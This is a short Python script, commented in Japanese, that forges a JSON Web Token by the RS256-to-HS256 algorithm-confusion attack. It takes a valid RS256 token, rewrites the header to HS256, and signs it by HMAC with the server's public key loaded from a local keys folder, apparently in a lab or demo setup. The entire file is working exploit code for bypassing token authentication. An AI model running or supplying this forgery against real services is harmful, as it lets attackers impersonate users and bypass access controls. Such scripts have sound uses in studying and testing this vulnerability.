import base64
import hashlib
import hmac


token = input("正規のRS256 JWT: ")

with open("../server/keys/public.pem", "rb") as f:
    public_key = f.read()

# JWTを分解
header, payload, _ = token.split(".")

# algをHS256に変更
header = base64.urlsafe_b64encode(
    b'{"alg":"HS256","typ":"JWT"}'
).rstrip(b"=").decode()

# 攻撃対象となる署名部分
signing_input = f"{header}.{payload}"

# 公開鍵を「HMACのSecret」として使用 <- 違うのに
signature = hmac.new(
    public_key,
    signing_input.encode(),
    hashlib.sha256,
).digest()

signature = base64.urlsafe_b64encode(
    signature
).rstrip(b"=").decode()

forged_token = f"{signing_input}.{signature}"

print("\n=== Forged JWT ===")
print(forged_token)